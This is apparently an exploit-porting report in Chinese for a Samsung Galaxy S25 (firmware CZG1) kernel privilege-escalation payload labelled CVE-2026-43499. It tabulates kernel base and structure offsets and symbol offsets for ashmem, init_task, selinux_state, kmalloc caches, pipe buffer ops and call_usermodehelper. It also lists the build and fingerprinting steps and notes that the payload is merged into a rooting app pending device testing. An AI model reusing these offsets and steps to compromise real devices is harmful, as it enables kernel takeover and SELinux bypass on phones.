# S25 国行 CZG1 载荷定标报告

> 日期：2026-08-24
> 固件：S9310ZCSCCZG1（SM-S9310/S9360/S9380 国行 S25 系列，One UI 8.5）
> 内核：`6.6.98-android15-8-p5a696e2-abogkiS9310ZCSCCZG1-4k`（Android 15 GKI）
> 载荷：`cve-2026-43499-czg1`（104128 B，与 DZF2 stable 同规格）

## 关键差异（vs S24 6.1.145）

| 项 | S24 DZF2 (6.1.145) | S25 CZG1 (6.6.98) |
|---|---|---|
| KIMAGE_TEXT_BASE | 0xffffffc008000000 | **0xffffffc080000000** |
| STRUCT_SLAB_CACHE_OFF | 0x18 | **0x08** |
| STRUCT_PAGE_SIZE | 0x40 | 0x40（未变） |
| STRUCT_PAGE_COMPOUND_HEAD_OFF | 0x08 | 0x08（未变） |
| STRUCT_PAGE_TYPE_OFF | 0x30 | 0x30（未变） |
| file_operations 布局 | 标准 | 标准（已核验 fops 表） |
| miscdevice.fops 偏移 | +0x10 | +0x10（已核验 ashmem_misc） |
| KernelSU 驱动 | ksud-selected (android14-6.1) | **ksud-android15-6.6-kdp** |

## 符号偏移（KIMAGE_TEXT_BASE 0xffffffc080000000 之上）

```
ASHMEM_MISC_FOPS_OFF        = 0x0247d7f0  (ashmem_misc+0x10, fops 字段)
ASHMEM_FOPS_OFF             = 0x0140b440
ASHMEM_IOCTL_OFF            = 0x00d70dfc
ASHMEM_COMPAT_IOCTL_OFF     = 0x00d714b8
ASHMEM_MMAP_OFF             = 0x00d7150c
ASHMEM_OPEN_OFF             = 0x00d7172c
ASHMEM_RELEASE_OFF          = 0x00d717b4
ASHMEM_SHOW_FDINFO_OFF      = 0x00d71840
CONFIGFS_READ_ITER_OFF      = 0x004954b8
CONFIGFS_BIN_WRITE_ITER_OFF = 0x004959e4
COPY_SPLICE_READ_OFF        = 0x00416970
NOOP_LLSEEK_OFF             = 0x003c9450
INIT_TASK_OFF               = 0x0230e4c0
ROOT_TASK_GROUP_OFF         = 0x0251cd80
SELINUX_ENFORCING_OFF       = 0x0255f5c0  (selinux_state)
KMALLOC_CACHES_OFF          = 0x017dac30
ANON_PIPE_BUF_OPS_OFF       = 0x0124cdc8
CALL_USERMODEHELPER_EXEC_WORK_OFF = 0x000d0eac
SYSTEM_UNBOUND_WQ_OFF       = 0x022fae60
SLIDE_NFULNL_LOGGER_OFF     = 0x02302278
SLIDE_LOGGERS_0_1_OFF       = 0x023021c0  (loggers 数组)
SLIDE_RANDOM_BOOT_ID_DATA_OFF = 0x026426d8 (sysctl_bootid)
SLIDE_SYSCTL_BOOTID_OFF     = 0x026426d8
```

## 6.6 内核结构变化要点

1. **ashmem 符号重命名**：6.6 中 `ashmem_misc` 是 miscdevice 结构（0x247d7e0），fops 字段在 +0x10（与 6.1 相同布局）。misc_register 反汇编确认参数即 ashmem_misc 地址。
2. **fops 表验证**：读 ELF 中 ashmem_fops 表（0x140b440），llseek/read_iter/ioctl/compat_ioctl/mmap/open/release/show_fdinfo 与 nm 符号一一对应，6.6 file_operations 布局与 6.1 一致。
3. **selinux**：`selinux_enforcing` 布尔 → `selinux_state` 全局结构（0x255f5c0）。
4. **pipe_buffer / anon_pipe_buf_ops**：anon_pipe_buf_ops 内部布局 6.6 有调整（confirm=null, +0x08 release, +0x10 try_steal, +0x18 get），但 exploit 仅用其地址做指针比对，不影响。
5. **nfulnl_logger**：6.6 中为静态 logger 对象（0x2302278），与 loggers 数组（0x23021c0）相邻。

## p0_fingerprint

从 vmlinux_czg1.elf 生成（32 行，slide 0x000000-0x1f0000 步进 0x010000），采样偏移 0x000/0x200/.../0xe00。公式：`ELF 文件偏移 = 0x1c0 + (0x1f0000 - slide)`。末行 = Image[0] = MZ 魔数 `0x147a5019fa405a4d` 验证通过。

## 适配过程

1. `magiskboot unpack s25u_czg1.img` → kernel（38.8MB raw Image）
2. `vmlinux-to-elf kernel vmlinux_czg1.elf` → 带符号 ELF（基址 0xffffffc080000000 = _text）
3. `nm` 提取符号地址 → 对照 DZF2 target.h 生成 target.h
4. 读 ELF 验证 miscdevice fops 字段与 fops 表布局
5. 生成 p0_fingerprint.h
6. NDK r29 (API 35) 构建 `cve-2026-43499-app.stable.so`
7. ksud 换用 `ksud-samsung-android15-6.6-kdp`（RootMyGalaxy v3 载荷库提供，同源）

## 状态

- 已定标，编译通过，载荷与 6.6 ksud 已并入 App 主线（v3.0.0 build 108）
- 待真机验证（S25 系列国行实机）
- 注意：Fingerprint `samsung/r0qsqw/r0q:15/AP3A.240905.015.A2/S9310ZCSCCZG1:user/release-keys` 从内核字符串提取，若真机构建不同需核对
